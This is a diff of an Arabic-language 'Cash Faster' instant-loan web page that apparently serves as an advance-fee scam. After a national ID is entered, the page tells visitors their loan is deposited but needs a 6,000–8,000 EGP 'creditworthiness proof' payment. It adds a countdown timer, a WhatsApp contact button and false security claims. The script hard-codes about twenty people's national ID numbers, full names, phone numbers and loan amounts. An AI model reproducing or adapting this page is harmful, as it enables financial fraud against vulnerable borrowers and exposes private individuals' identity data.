@@ -11,24 +11,17 @@
         :root {
             --primary-cyan: #00D9FF;
             --primary-purple: #9D4EDD;
-            --primary-pink: #FF006E;
             --primary-lime: #3FFF00;
             --accent-gold: #FFD700;
             --accent-orange: #FF6B35;
-            --background: #0F1419;
-            --surface: #1A1F3A;
             --text-light: #FFFFFF;
             --text-muted: #B0B9C3;
-            --radius: 1rem;
         }
-        html { scroll-behavior: smooth; }
         body {
             font-family: 'Cairo', sans-serif;
             background: linear-gradient(135deg, #0F1419 0%, #1a0f2e 50%, #0a1628 100%);
             color: var(--text-light);
             min-height: 100vh;
-            position: relative;
-            overflow-x: hidden;
         }
         body::before {
             content: '';
@@ -37,425 +30,165 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: 
-                linear-gradient(0deg, transparent 24%, rgba(0, 217, 255, 0.03) 25%, rgba(0, 217, 255, 0.03) 26%, transparent 27%, transparent 74%, rgba(0, 217, 255, 0.03) 75%, rgba(0, 217, 255, 0.03) 76%, transparent 77%, transparent),
-                linear-gradient(90deg, transparent 24%, rgba(0, 217, 255, 0.03) 25%, rgba(0, 217, 255, 0.03) 26%, transparent 27%, transparent 74%, rgba(0, 217, 255, 0.03) 75%, rgba(0, 217, 255, 0.03) 76%, transparent 77%, transparent);
+            background: repeating-linear-gradient(transparent 24%, rgba(0,217,255,0.03) 25%, rgba(0,217,255,0.03) 26%, transparent 27%);
             background-size: 50px 50px;
             animation: gridMove 20s linear infinite;
             pointer-events: none;
             z-index: 0;
         }
         @keyframes gridMove { 0% { background-position: 0 0; } 100% { background-position: 50px 50px; } }
-        body::after {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at 20% 50%, rgba(157, 78, 221, 0.05) 0%, transparent 50%),
-                        radial-gradient(circle at 80% 80%, rgba(0, 217, 255, 0.05) 0%, transparent 50%);
-            pointer-events: none;
-            z-index: 0;
-        }
         .container { max-width: 1000px; margin: 0 auto; padding: 1rem; position: relative; z-index: 2; }
-        header {
-            text-align: center;
-            margin-bottom: 1.5rem;
-            animation: slideDown 0.6s ease-out;
-            background: rgba(15, 20, 40, 0.8);
-            backdrop-filter: blur(10px);
-            padding: 1rem;
-            border-radius: 1.5rem;
-            border: 1px solid rgba(0, 217, 255, 0.2);
-        }
-        @keyframes slideDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
-        .logo-container { display: flex; align-items: center; justify-content: center; gap: 1rem; margin-bottom: 0.5rem; }
-        .logo-icon { font-size: 2.5rem; background: linear-gradient(135deg, var(--primary-cyan), var(--primary-purple)); -webkit-background-clip: text; background-clip: text; color: transparent; }
-        .logo h1 { font-size: 1.8rem; background: linear-gradient(135deg, var(--primary-cyan), var(--primary-purple)); -webkit-background-clip: text; background-clip: text; color: transparent; letter-spacing: 1px; font-weight: 800; }
-        .logo-sub { color: var(--accent-gold); font-size: 0.8rem; margin-top: 0.3rem; font-weight: 600; }
-        .security-badge { display: inline-block; background: rgba(0, 217, 255, 0.1); border: 1px solid var(--primary-cyan); color: var(--primary-cyan); padding: 0.4rem 1rem; border-radius: 2rem; font-size: 0.7rem; font-weight: 700; margin-top: 0.5rem; box-shadow: 0 0 15px rgba(0, 217, 255, 0.2); }
-        .search-card { background: linear-gradient(135deg, rgba(15, 20, 40, 0.9), rgba(26, 31, 58, 0.8)); backdrop-filter: blur(12px); border: 2px solid rgba(0, 217, 255, 0.3); border-radius: 1.5rem; padding: 1.8rem; margin-bottom: 1.5rem; box-shadow: 0 0 30px rgba(0, 217, 255, 0.1); transition: 0.3s; }
-        .search-card:hover { border-color: var(--primary-cyan); box-shadow: 0 0 40px rgba(0, 217, 255, 0.15); }
-        .search-title { font-size: 1.3rem; color: var(--primary-cyan); margin-bottom: 0.8rem; font-weight: 700; }
-        .search-subtitle { color: var(--text-muted); margin-bottom: 1.2rem; font-size: 0.85rem; }
+        header { text-align: center; margin-bottom: 1.5rem; background: rgba(15,20,40,0.8); backdrop-filter: blur(10px); padding: 1rem; border-radius: 1.5rem; }
+        .logo h1 { font-size: 1.8rem; background: linear-gradient(135deg, var(--primary-cyan), var(--primary-purple)); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        .security-badge { display: inline-block; background: rgba(0,217,255,0.1); border: 1px solid var(--primary-cyan); padding: 0.4rem 1rem; border-radius: 2rem; font-size: 0.7rem; margin-top: 0.5rem; }
+        .search-card { background: rgba(15,20,40,0.9); backdrop-filter: blur(12px); border: 2px solid rgba(0,217,255,0.3); border-radius: 1.5rem; padding: 1.8rem; margin-bottom: 1.5rem; }
         .input-group { max-width: 400px; margin: 0 auto; }
-        .input-group input { width: 100%; padding: 0.9rem 1rem; background: rgba(0, 0, 0, 0.5); border: 2px solid var(--primary-cyan); border-radius: 2.5rem; color: var(--text-light); font-size: 0.95rem; text-align: center; font-family: 'Cairo', sans-serif; font-weight: 600; transition: 0.3s; }
-        .input-group input:focus { outline: none; border-color: var(--accent-gold); box-shadow: 0 0 20px rgba(0, 217, 255, 0.4); background: rgba(0, 0, 0, 0.7); }
-        .btn-search { background: linear-gradient(135deg, var(--primary-cyan), var(--primary-purple)); border: none; padding: 0.9rem; border-radius: 2.5rem; font-size: 1rem; font-weight: 800; color: white; cursor: pointer; transition: 0.3s; font-family: 'Cairo', sans-serif; margin-top: 1.2rem; width: 100%; max-width: 320px; margin-left: auto; margin-right: auto; display: block; box-shadow: 0 5px 15px rgba(0, 217, 255, 0.25); }
-        .btn-search:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0, 217, 255, 0.4); }
-        .btn-search:active { transform: translateY(0); }
+        .input-group input { width: 100%; padding: 0.9rem; background: rgba(0,0,0,0.5); border: 2px solid var(--primary-cyan); border-radius: 2.5rem; color: white; text-align: center; font-size: 0.95rem; }
+        .btn-search { background: linear-gradient(135deg, var(--primary-cyan), var(--primary-purple)); border: none; padding: 0.9rem; border-radius: 2.5rem; font-weight: 800; color: white; cursor: pointer; margin-top: 1rem; width: 100%; max-width: 320px; display: block; margin-left: auto; margin-right: auto; }
         .result-section { display: none; animation: fadeInUp 0.6s ease; }
         .result-section.show { display: block; }
         @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
-        .success-header { text-align: center; background: linear-gradient(135deg, rgba(57, 255, 20, 0.12), rgba(0, 217, 255, 0.08)); border: 2px solid var(--primary-lime); border-radius: 2rem; padding: 1.5rem; margin-bottom: 1.5rem; box-shadow: 0 0 25px rgba(57, 255, 20, 0.15); }
-        .success-header h2 { color: var(--primary-lime); font-size: 1.6rem; margin-bottom: 0.3rem; font-weight: 800; }
-        .success-header p { color: var(--text-muted); font-size: 0.9rem; }
-        .receipt-card {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            border: 2px solid #d4af37;
-            border-radius: 2rem;
-            padding: 1.8rem;
-            margin: 1.5rem 0;
-            box-shadow: 0 0 30px rgba(212, 175, 55, 0.3);
-            position: relative;
-            font-family: 'Cairo', monospace;
-        }
-        .receipt-header {
-            text-align: center;
-            border-bottom: 2px dashed #d4af37;
-            padding-bottom: 1rem;
-            margin-bottom: 1.2rem;
-        }
-        .receipt-header h2 {
-            color: var(--primary-lime);
-            font-size: 1.8rem;
-            font-weight: 800;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.8rem;
-        }
-        .receipt-header h2 i {
-            color: #d4af37;
-            font-size: 2rem;
-        }
-        .receipt-badge {
-            background: rgba(57, 255, 20, 0.2);
-            display: inline-block;
-            padding: 0.3rem 1rem;
-            border-radius: 2rem;
-            font-size: 0.8rem;
-            font-weight: 700;
-            color: var(--primary-lime);
-            margin-top: 0.5rem;
-        }
-        .receipt-details {
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 1.2rem;
-            padding: 1.2rem;
-            margin: 1.2rem 0;
-        }
-        .detail-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 0.7rem 0;
-            border-bottom: 1px solid rgba(212, 175, 55, 0.2);
-            font-size: 0.9rem;
-        }
-        .detail-row:last-child {
-            border-bottom: none;
-        }
-        .detail-label {
-            color: var(--text-muted);
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-        .detail-value {
-            font-weight: 800;
-            color: #d4af37;
-            text-align: left;
-            direction: ltr;
-            font-family: monospace;
-            font-size: 0.95rem;
-        }
-        .amount-big {
-            background: linear-gradient(135deg, rgba(212, 175, 55, 0.2), rgba(57, 255, 20, 0.1));
-            text-align: center;
-            padding: 1rem;
-            border-radius: 1.5rem;
-            margin: 1rem 0;
-        }
-        .amount-big .label {
-            font-size: 0.9rem;
-            color: var(--text-muted);
-        }
-        .amount-big .value {
-            font-size: 2.5rem;
-            font-weight: 900;
-            color: #d4af37;
-            text-shadow: 0 0 10px rgba(212, 175, 55, 0.5);
-        }
-        .receipt-footer {
-            text-align: center;
-            margin-top: 1.2rem;
-            font-size: 0.8rem;
-            color: var(--primary-lime);
-            border-top: 1px dashed #d4af37;
-            padding-top: 1rem;
-        }
-        .info-message {
-            background: rgba(0, 217, 255, 0.1);
-            border-radius: 1rem;
-            padding: 1rem;
-            margin: 1rem 0;
-            text-align: center;
-            border-right: 4px solid var(--primary-cyan);
-        }
-        .creditworthiness-section { background: linear-gradient(135deg, rgba(0, 217, 255, 0.08), rgba(157, 78, 221, 0.05)); border: 2px solid var(--primary-cyan); border-radius: 2rem; padding: 2rem; margin: 1.5rem 0; box-shadow: 0 0 25px rgba(0, 217, 255, 0.12); }
-        .section-title { font-size: 1.4rem; color: var(--primary-cyan); margin-bottom: 1.2rem; display: flex; align-items: center; gap: 0.6rem; font-weight: 800; padding-bottom: 0.8rem; border-bottom: 2px solid rgba(0, 217, 255, 0.25); }
-        .info-box { background: rgba(0, 217, 255, 0.08); border-left: 4px solid var(--primary-cyan); border-radius: 1rem; padding: 1.2rem; margin: 1.2rem 0; color: var(--text-muted); line-height: 1.7; font-size: 0.9rem; }
-        .info-box strong { color: var(--primary-cyan); font-weight: 700; }
-        .info-box.success { background: rgba(57, 255, 20, 0.08); border-left-color: var(--primary-lime); }
-        .info-box.success strong { color: var(--primary-lime); }
-        .info-box.warning { background: rgba(255, 107, 53, 0.08); border-left-color: var(--accent-orange); }
-        .info-box.warning strong { color: var(--accent-orange); }
-        .proof-step { background: rgba(0, 0, 0, 0.3); border-left: 4px solid var(--primary-cyan); padding: 1.2rem; margin-bottom: 1rem; border-radius: 1rem; transition: 0.3s; }
-        .proof-step:hover { background: rgba(0, 0, 0, 0.5); border-left-color: var(--accent-gold); transform: translateX(-3px); }
-        .proof-step-number { font-size: 1.2rem; font-weight: 900; color: var(--accent-gold); margin-bottom: 0.6rem; display: flex; align-items: center; gap: 0.4rem; }
-        .proof-step-title { font-size: 1rem; font-weight: 700; color: var(--primary-cyan); margin-bottom: 0.6rem; }
-        .proof-step-content { color: var(--text-muted); line-height: 1.7; font-size: 0.9rem; }
-        .amount-highlight { background: rgba(255, 215, 0, 0.12); border: 2px solid var(--accent-gold); border-radius: 1rem; padding: 1rem; margin: 0.8rem 0; text-align: center; font-size: 1.3rem; font-weight: 800; color: var(--accent-gold); text-shadow: 0 0 12px rgba(255, 215, 0, 0.4); }
-        .timer-section { background: rgba(255, 107, 53, 0.08); border: 2px solid var(--accent-orange); border-radius: 1.5rem; padding: 1.5rem; text-align: center; margin: 1.2rem 0; }
-        .timer-label { font-size: 1rem; color: var(--accent-orange); margin-bottom: 0.8rem; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 0.4rem; }
-        .timer {
-            font-size: 2.2rem;
-            font-weight: 900;
-            font-family: 'Courier New', monospace;
-            color: var(--accent-gold);
-            margin: 0.8rem 0;
-            text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
-            letter-spacing: 1px;
-            animation: timerGlow 1s ease-in-out infinite;
-        }
-        @keyframes timerGlow {
-            0%, 100% { text-shadow: 0 0 15px rgba(255, 215, 0, 0.5), 0 0 25px rgba(255, 107, 53, 0.3); transform: scale(1); }
-            50% { text-shadow: 0 0 25px rgba(255, 215, 0, 0.8), 0 0 40px rgba(255, 107, 53, 0.6); transform: scale(1.05); }
-        }
-        .suspended-card { background: linear-gradient(135deg, rgba(255, 107, 53, 0.15), rgba(255, 0, 110, 0.1)); border: 3px solid var(--accent-orange); border-radius: 2rem; padding: 2rem; text-align: center; margin: 1.5rem 0; animation: pulseWarning 1.5s infinite; }
-        @keyframes pulseWarning { 0% { box-shadow: 0 0 0 0 rgba(255, 107, 53, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(255, 107, 53, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 107, 53, 0); } }
-        .suspended-icon { font-size: 4rem; color: var(--accent-orange); margin-bottom: 1rem; }
-        .suspended-title { font-size: 1.8rem; font-weight: 800; color: var(--accent-orange); margin-bottom: 1rem; }
-        .suspended-message { font-size: 1rem; color: var(--text-muted); margin-bottom: 1.5rem; line-height: 1.8; }
-        .selfie-container { background: rgba(0, 0, 0, 0.5); border-radius: 1.5rem; padding: 1rem; margin: 1rem auto; max-width: 300px; border: 2px solid var(--accent-gold); }
-        .selfie-container img { width: 100%; border-radius: 1rem; display: block; }
-        .selfie-caption { font-size: 0.85rem; color: var(--accent-gold); margin-top: 0.5rem; font-weight: 600; }
-        .btn-whatsapp-suspend { background: linear-gradient(135deg, #25D366, #128C7E); border: none; padding: 0.9rem 1.8rem; border-radius: 3rem; font-size: 1rem; font-weight: 700; cursor: pointer; transition: 0.3s; font-family: 'Cairo', sans-serif; display: inline-flex; align-items: center; justify-content: center; gap: 0.8rem; color: white; margin-top: 1rem; }
-        .btn-whatsapp-suspend:hover { transform: translateY(-2px); box-shadow: 0 0 25px rgba(37, 211, 102, 0.6); }
-        .error-card { background: rgba(255, 107, 107, 0.08); border: 2px solid rgba(255, 107, 107, 0.4); border-radius: 1.5rem; padding: 2rem; text-align: center; display: none; animation: fadeInUp 0.5s ease; }
-        .error-card.show { display: block; }
-        .error-card i { font-size: 2.5rem; color: #ff6b6b; margin-bottom: 0.8rem; }
-        .error-card p { color: var(--text-muted); font-size: 0.9rem; line-height: 1.7; }
+        .success-header { text-align: center; background: rgba(57,255,20,0.12); border: 2px solid var(--primary-lime); border-radius: 2rem; padding: 1.5rem; margin-bottom: 1.5rem; }
+        .success-header h2 { color: var(--primary-lime); font-size: 1.6rem; }
+        .receipt-card { background: linear-gradient(135deg, #1a1a2e, #16213e); border: 2px solid #d4af37; border-radius: 2rem; padding: 1.8rem; margin: 1.5rem 0; }
+        .amount-big { text-align: center; background: rgba(212,175,55,0.2); border-radius: 1.5rem; padding: 1rem; margin: 1rem 0; }
+        .amount-big .value { font-size: 2.5rem; font-weight: 900; color: #d4af37; }
+        .detail-row { display: flex; justify-content: space-between; padding: 0.7rem 0; border-bottom: 1px solid rgba(212,175,55,0.2); }
+        .creditworthiness-section { background: rgba(0,217,255,0.08); border: 2px solid var(--primary-cyan); border-radius: 2rem; padding: 2rem; margin: 1.5rem 0; }
+        .section-title { font-size: 1.4rem; color: var(--primary-cyan); margin-bottom: 1.2rem; }
+        .proof-step { background: rgba(0,0,0,0.3); border-left: 4px solid var(--primary-cyan); padding: 1.2rem; margin-bottom: 1rem; border-radius: 1rem; }
+        .proof-step-number { font-size: 1.2rem; font-weight: 900; color: var(--accent-gold); margin-bottom: 0.6rem; }
+        .amount-highlight { background: rgba(255,215,0,0.12); border: 2px solid var(--accent-gold); border-radius: 1rem; padding: 1rem; text-align: center; font-size: 1.3rem; font-weight: 800; color: var(--accent-gold); margin: 0.8rem 0; }
+        .timer-section { background: rgba(255,107,53,0.08); border: 2px solid var(--accent-orange); border-radius: 1.5rem; padding: 1.5rem; text-align: center; margin: 1.2rem 0; }
+        .timer { font-size: 2.2rem; font-weight: 900; font-family: monospace; color: var(--accent-gold); animation: timerGlow 1s infinite; }
+        @keyframes timerGlow { 50% { text-shadow: 0 0 25px rgba(255,215,0,0.8); transform: scale(1.05); } }
+        .error-card { background: rgba(255,107,107,0.08); border: 2px solid rgba(255,107,107,0.4); border-radius: 1.5rem; padding: 2rem; text-align: center; display: none; }
         .loader { display: none; text-align: center; margin: 1rem 0; }
         .loader.show { display: block; }
         .loader i { font-size: 2rem; color: var(--primary-cyan); animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .footer-info { text-align: center; margin-top: 1.5rem; padding-top: 1.2rem; border-top: 1px solid rgba(0, 217, 255, 0.15); color: var(--text-muted); font-size: 0.8rem; line-height: 1.6; }
-        @media (max-width: 768px) {
-            .logo h1 { font-size: 1.4rem; }
-            .amount-big .value { font-size: 1.8rem; }
-            .timer { font-size: 1.8rem; }
-            .detail-row { flex-direction: column; align-items: flex-start; gap: 0.3rem; }
-            .detail-value { text-align: right; }
-            .receipt-card { padding: 1rem; }
-        }
+        @media (max-width: 768px) { .amount-big .value { font-size: 1.8rem; } .timer { font-size: 1.8rem; } .detail-row { flex-direction: column; gap: 0.3rem; } }
     </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <div class="logo-container">
-                <i class="fas fa-bolt logo-icon"></i>
-                <div><h1>Cash Faster</h1><p class="logo-sub">التمويل الفوري الذكي</p></div>
-            </div>
-            <div class="security-badge"><i class="fas fa-lock"></i> تشفير 256-bit | أمان عالي</div>
-        </header>
-        <div class="search-card">
-            <h2 class="search-title"><i class="fas fa-mobile-alt"></i> حول لحسابي الآن</h2>
-            <p class="search-subtitle">أدخل رقم بطاقتك القومية (14 رقم)</p>
-            <div class="input-group">
-                <input type="text" id="nationalId" placeholder="أدخل الرقم القومي" maxlength="14" inputmode="numeric">
-                <button class="btn-search" onclick="searchCustomer()"><i class="fas fa-check-circle"></i> حول لحسابي الآن</button>
-            </div>
-            <div class="loader" id="loader"><i class="fas fa-spinner"></i></div>
+<div class="container">
+    <header><div class="logo"><h1>💰 Cash Faster</h1></div><div class="security-badge"><i class="fas fa-lock"></i> تشفير 256-bit</div></header>
+    <div class="search-card">
+        <h2 class="search-title">📱 حول لحسابي الآن</h2>
+        <div class="input-group">
+            <input type="text" id="nationalId" placeholder="أدخل الرقم القومي (14 رقم)" maxlength="14" inputmode="numeric">
+            <button class="btn-search" onclick="searchCustomer()"><i class="fas fa-check-circle"></i> حول لحسابي الآن</button>
         </div>
-        <div class="result-section" id="resultSection">
-            <div id="suspendedContainer" style="display: none;"></div>
-            <div id="normalContent" style="display: none;">
-                <div class="success-header"><h2><i class="fas fa-check-circle"></i> مرحلة تأكيد التحويل</h2><p>تم إيداع التمويل في حسابك بنجاح - ينتظر إثبات الجدارة الائتمانية</p></div>
-                <div id="paymentCardContainer"></div>
-                <div id="creditworthinessContainer"></div>
-                <div class="info-box" style="background: rgba(57, 255, 20, 0.08); border-left-color: var(--primary-lime);"><strong><i class="fas fa-lock"></i> الأمان والخصوصية</strong><br>جميع بياناتك محمية بتشفير 256-bit من الدرجة العسكرية. النظام يتوافق مع أعلى المعايير الدولية. لا يتم مشاركة بياناتك مع أي جهة خارجية.</div>
-            </div>
-        </div>
-        <div class="error-card" id="errorCard"><i class="fas fa-exclamation-triangle"></i><p>⚠️ الرقم القومي غير مسجل في النظام<br>يرجى التأكد من الرقم أو التواصل مع الدعم</p></div>
-        <div class="footer-info"><p><i class="fas fa-shield-alt"></i> جميع البيانات محمية بأعلى معايير الأمان الدولية<br><i class="fas fa-check"></i> نظام معتمد ومرخص | <i class="fas fa-lock"></i> تشفير عسكري</p></div>
+        <div class="loader" id="loader"><i class="fas fa-spinner"></i></div>
     </div>
+    <div class="result-section" id="resultSection">
+        <div id="normalContent" style="display: none;">
+            <div class="success-header"><h2>✅ مرحلة تأكيد التحويل</h2><p>تم إيداع التمويل في حسابك - ينتظر إثبات الجدارة</p></div>
+            <div id="paymentCardContainer"></div>
+            <div id="creditworthinessContainer"></div>
+        </div>
+    </div>
+    <div class="error-card" id="errorCard"><i class="fas fa-exclamation-triangle"></i><p>⚠️ الرقم القومي غير مسجل</p></div>
+</div>
 
-    <script>
-        // =============================================
-        // قاعدة العملاء الجديدة (20 عميلاً من ملف Excel)
-        // تم استبدال العملاء القدامى بالكامل
-        // جميع العملاء الجدد بحالة suspended: false
-        // =============================================
-        const customersDatabase = {
-            "28703111100311": { name: "محمد محمد مصطفي صيام", wallet: "فودافون كاش", walletNum: "01001602909", loan: 150000, suspended: false },
-            "28906270200731": { name: "محمد احمد عبدالله عبدالقادر", wallet: "لا يوجد محفظة", walletNum: "01283498080", loan: 145000, suspended: false },
-            "28412180102258": { name: "إبراهيم صلاح إبراهيم محمد", wallet: "فودافون كاش", walletNum: "01022138111", loan: 60000, suspended: false },
-            "29704130102588": { name: "زينب حسن محمود موسى", wallet: "فودافون كاش", walletNum: "01044615740", loan: 200000, suspended: false },
-            "29904241301679": { name: "محمد السيد عبد الستار محمد", wallet: "فودافون كاش", walletNum: "01069833285", loan: 200000, suspended: false },
-            "25302220201075": { name: "عبد الستار بربري أبوزيد شاهين", wallet: "فودافون كاش", walletNum: "01060868918", loan: 40000, suspended: false },
-            "28509012120139": { name: "مصطفى محمد امبابى مهران", wallet: "فودافون كاش", walletNum: "01067567527", loan: 200000, suspended: false },
-            "28309190104857": { name: "محمد عبد الكريم جمال محمد", wallet: "فودافون كاش", walletNum: "01033032503", loan: 100000, suspended: false },
-            "27310150101671": { name: "ممدوح محمد رضا محمد صقر", wallet: "فودافون كاش", walletNum: "01024159249", loan: 35000, suspended: false },
-            "26611022200531": { name: "عاطف علام عبد الحميد سلطان", wallet: "فودافون كاش", walletNum: "01050786847", loan: 85000, suspended: false },
-            "27909180400222": { name: "نجلاء جلال عبده محمد", wallet: "لا يوجد محفظة", walletNum: "01097847686", loan: 200000, suspended: false },
-            "27707070106815": { name: "وليد معوض موسى شرقاوي", wallet: "فودافون كاش", walletNum: "01019114882", loan: 70000, suspended: false },
-            "27404210101395": { name: "محمد عبدالوهاب ابراهيم", wallet: "فودافون كاش", walletNum: "01017693528", loan: 50000, suspended: false },
-            "28911202105597": { name: "علاء الدين حاتم محمد عبدالسلام", wallet: "فودافون كاش", walletNum: "01055119921", loan: 200000, suspended: false },
-            "25210090102914": { name: "احمد بدوى على بدوى", wallet: "فودافون كاش", walletNum: "01113912643", loan: 40000, suspended: false },
-            "28001300103377": { name: "ابراهيم جابر مبارك محمود", wallet: "اتصالات كاش", walletNum: "01119543983", loan: 200000, suspended: false },
-            "27803061301779": { name: "محمد عبدالله حسين حسين", wallet: "فودافون كاش", walletNum: "01007197584", loan: 200000, suspended: false },
-            "29110012705815": { name: "محمد حسني احمد محمد", wallet: "فودافون كاش", walletNum: "01016090373", loan: 85000, suspended: false },
-            "29003090102514": { name: "محمود احمد احمد ابراهيم ابو السعود", wallet: "اتصالات كاش", walletNum: "01112941749", loan: 100000, suspended: false }
-        };
+<script>
+const customersDatabase = {
+    "28703111100311": { name: "محمد محمد مصطفي صيام", wallet: "فودافون كاش", walletNum: "01001602909", loan: 150000, suspended: false },
+    "28906270200731": { name: "محمد احمد عبدالله عبدالقادر", wallet: "لا يوجد محفظة", walletNum: "01283498080", loan: 145000, suspended: false },
+    "28412180102258": { name: "إبراهيم صلاح إبراهيم محمد", wallet: "فودافون كاش", walletNum: "01022138111", loan: 60000, suspended: false },
+    "29704130102588": { name: "زينب حسن محمود موسى", wallet: "فودافون كاش", walletNum: "01044615740", loan: 200000, suspended: false },
+    "29904241301679": { name: "محمد السيد عبد الستار محمد", wallet: "فودافون كاش", walletNum: "01069833285", loan: 200000, suspended: false },
+    "25302220201075": { name: "عبد الستار بربري أبوزيد شاهين", wallet: "فودافون كاش", walletNum: "01060868918", loan: 40000, suspended: false },
+    "28509012120139": { name: "مصطفى محمد امبابى مهران", wallet: "فودافون كاش", walletNum: "01067567527", loan: 200000, suspended: false },
+    "28309190104857": { name: "محمد عبد الكريم جمال محمد", wallet: "فودافون كاش", walletNum: "01033032503", loan: 100000, suspended: false },
+    "27310150101671": { name: "ممدوح محمد رضا محمد صقر", wallet: "فودافون كاش", walletNum: "01024159249", loan: 35000, suspended: false },
+    "26611022200531": { name: "عاطف علام عبد الحميد سلطان", wallet: "فودافون كاش", walletNum: "01050786847", loan: 85000, suspended: false },
+    "27909180400222": { name: "نجلاء جلال عبده محمد", wallet: "لا يوجد محفظة", walletNum: "01097847686", loan: 200000, suspended: false },
+    "27707070106815": { name: "وليد معوض موسى شرقاوي", wallet: "فودافون كاش", walletNum: "01019114882", loan: 70000, suspended: false },
+    "27404210101395": { name: "محمد عبدالوهاب ابراهيم", wallet: "فودافون كاش", walletNum: "01017693528", loan: 50000, suspended: false },
+    "28911202105597": { name: "علاء الدين حاتم محمد عبدالسلام", wallet: "فودافون كاش", walletNum: "01055119921", loan: 200000, suspended: false },
+    "25210090102914": { name: "احمد بدوى على بدوى", wallet: "فودافون كاش", walletNum: "01113912643", loan: 40000, suspended: false },
+    "28001300103377": { name: "ابراهيم جابر مبارك محمود", wallet: "اتصالات كاش", walletNum: "01119543983", loan: 200000, suspended: false },
+    "27803061301779": { name: "محمد عبدالله حسين حسين", wallet: "فودافون كاش", walletNum: "01007197584", loan: 200000, suspended: false },
+    "29110012705815": { name: "محمد حسني احمد محمد", wallet: "فودافون كاش", walletNum: "01016090373", loan: 85000, suspended: false },
+    "29003090102514": { name: "محمود احمد احمد ابراهيم ابو السعود", wallet: "اتصالات كاش", walletNum: "01112941749", loan: 100000, suspended: false },
+    "28903181600488": { name: "جهاد بسيونى عبدالخالق عيسى", wallet: "اتصالات كاش", walletNum: "01126040309", loan: 100000, suspended: false }
+};
 
-        const loanDetailsMap = {
-            30000: { months: 12, installment: 2750 }, 35000: { months: 12, installment: 3200 }, 40000: { months: 18, installment: 2500 },
-            50000: { months: 24, installment: 2300 }, 55000: { months: 24, installment: 2530 }, 60000: { months: 24, installment: 2760 },
-            65000: { months: 24, installment: 2990 }, 70000: { months: 30, installment: 2520 }, 75000: { months: 30, installment: 2690 },
-            80000: { months: 30, installment: 2870 }, 85000: { months: 30, installment: 3050 }, 100000: { months: 36, installment: 3200 },
-            125000: { months: 42, installment: 3400 }, 145000: { months: 48, installment: 4075 }, 150000: { months: 48, installment: 4205 },
-            155000: { months: 48, installment: 3800 }, 175000: { months: 48, installment: 4848 }, 180000: { months: 54, installment: 4435 },
-            185000: { months: 54, installment: 4557 }, 190000: { months: 60, installment: 4215 }, 195000: { months: 60, installment: 4325 },
-            200000: { months: 60, installment: 4440 }
-        };
+const loanDetailsMap = { 35000: { months: 12, installment: 3200 }, 40000: { months: 18, installment: 2500 }, 50000: { months: 24, installment: 2300 }, 60000: { months: 24, installment: 2760 }, 70000: { months: 30, installment: 2520 }, 85000: { months: 30, installment: 3050 }, 100000: { months: 36, installment: 3200 }, 145000: { months: 48, installment: 4075 }, 150000: { months: 48, installment: 4205 }, 200000: { months: 60, installment: 4440 } };
+function getLoanDetails(amount) { return loanDetailsMap[amount] || { months: 36, installment: 3200 }; }
+function formatCurrency(amount) { return amount.toLocaleString('ar-EG') + ' ج.م'; }
+function formatDate(date) { return date.toLocaleDateString('ar-EG'); }
+function formatTime(date) { return date.toLocaleTimeString('ar-EG'); }
+function calculateProofAmount(loan) { return loan < 100000 ? 6000 : 8000; }
+function generateTransactionId() { return Math.floor(Math.random() * 1000000000); }
+function generateApprovalCode() { return 'AP' + Math.floor(Math.random() * 1000000); }
 
-        let activeTimerInterval = null;
+let currentCustomer = null;
 
-        function formatCurrency(amount) { return amount.toLocaleString('ar-EG') + ' ج.م'; }
-        function formatDate(date) { return date.toLocaleDateString('ar-EG', { year: 'numeric', month: 'long', day: 'numeric' }); }
-        function formatTime(date) { return date.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' }); }
-        function getLoanDetails(amount) {
-            if (loanDetailsMap[amount]) return loanDetailsMap[amount];
-            const keys = Object.keys(loanDetailsMap).map(Number).sort((a,b)=>a-b);
-            let closest = keys[0];
-            for (let k of keys) if (Math.abs(k - amount) < Math.abs(closest - amount)) closest = k;
-            return loanDetailsMap[closest] || { months: 12, installment: 0 };
+function searchCustomer() {
+    const nationalId = document.getElementById('nationalId').value.trim();
+    if (!nationalId || nationalId.length !== 14) { alert('الرجاء إدخال 14 رقم'); return; }
+    document.getElementById('loader').classList.add('show');
+    document.getElementById('resultSection').classList.remove('show');
+    document.getElementById('errorCard').classList.remove('show');
+    setTimeout(() => {
+        document.getElementById('loader').classList.remove('show');
+        if (customersDatabase[nationalId]) {
+            currentCustomer = customersDatabase[nationalId];
+            currentCustomer.id = nationalId;
+            displayResult();
+        } else {
+            document.getElementById('errorCard').classList.add('show');
         }
-        function calculateProofAmount(loanAmount) {
-            if (loanAmount < 100000) return 6000;
-            else if (loanAmount >= 100000) return 8000;
-            else return 10000;
-        }
-        function calculateReceiptTime() { return Math.floor(Math.random() * 5) + 5; }
-        function generateTransactionId() { return Math.floor(Math.random() * 1000000000); }
-        function generateApprovalCode() { return 'AP' + Math.floor(Math.random() * 1000000); }
+    }, 1000);
+}
 
-        function searchCustomer() {
-            const nationalId = document.getElementById('nationalId').value.trim();
-            if (!nationalId) { alert('الرجاء إدخال رقم البطاقة القومية'); return; }
-            if (nationalId.length !== 14) { alert('رقم البطاقة القومية يجب أن يكون 14 رقم'); return; }
-            if (activeTimerInterval) clearInterval(activeTimerInterval);
-            document.getElementById('loader').classList.add('show');
-            document.getElementById('resultSection').classList.remove('show');
-            document.getElementById('errorCard').classList.remove('show');
-            setTimeout(() => {
-                document.getElementById('loader').classList.remove('show');
-                if (customersDatabase[nationalId]) {
-                    const customer = customersDatabase[nationalId];
